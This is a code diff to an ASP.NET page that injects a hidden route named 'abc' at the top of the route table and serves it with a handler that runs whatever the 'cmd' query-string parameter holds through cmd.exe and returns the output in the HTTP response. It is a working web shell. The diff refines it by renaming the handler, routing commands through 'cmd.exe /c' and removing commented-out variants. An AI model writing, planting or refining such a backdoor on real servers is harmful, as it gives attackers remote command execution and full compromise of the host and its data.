@@ -8,28 +8,33 @@
     {
         public IHttpHandler GetHttpHandler(RequestContext requestContext)
         {
-            return new Myhandler(requestContext);
+            return new MyHandler(requestContext);
         }
     }
 
-    public class Myhandler : IHttpHandler
-
+    public class MyHandler : IHttpHandler
     {
         public RequestContext RequestContext { get; private set; }
 
-        public Myhandler(RequestContext context)
+        public MyHandler(RequestContext context)
         {
             this.RequestContext = context;
         }
 
+        public bool IsReusable
+        {
+            get { return false; }
+        }
+
         public void ProcessRequest(HttpContext context)
         {
-            String Payload = context.Request.QueryString["cmd"];
-            if (Payload != null)
+            String cmd = context.Request.QueryString["cmd"];
+            if (cmd != null)
             {
                 HttpResponseBase response = new HttpResponseWrapper(context.Response);
                 Process p = new Process();
-                p.StartInfo.FileName = Payload;
+                p.StartInfo.FileName = "cmd.exe";
+                p.StartInfo.Arguments = "/c " + cmd;
                 Debug.WriteLine(p.StartInfo.FileName);
                 p.StartInfo.UseShellExecute = false;
                 p.StartInfo.RedirectStandardOutput = true;
@@ -39,23 +44,10 @@
                 response.Write(System.Text.Encoding.Default.GetString(data));
             }
         }
-
-        public bool IsReusable
-        {
-            get { return false; }
-        }
     }
 </script>
 
 <%
     Response.Write("ok");
-    RouteCollection routes = RouteTable.Routes;
     RouteTable.Routes.Insert(0, new Route("abc", new MyRoute()));
-    //RouteTable.Routes.Insert(0, new Route("abc", new CustomRouteHandler()));
-
-    //new Route("mr6{page}", new MyRoute());
-    //routes.Insert(0, (RouteBase)new MyRoute());
-    //new Route("mr6{page}", new MyRoute());
-    //RouteTable.Routes.Add(new Route("abc", new CustomRouteHandler()));
-    //RegisterRoutes(RouteTable.Routes);
 %>
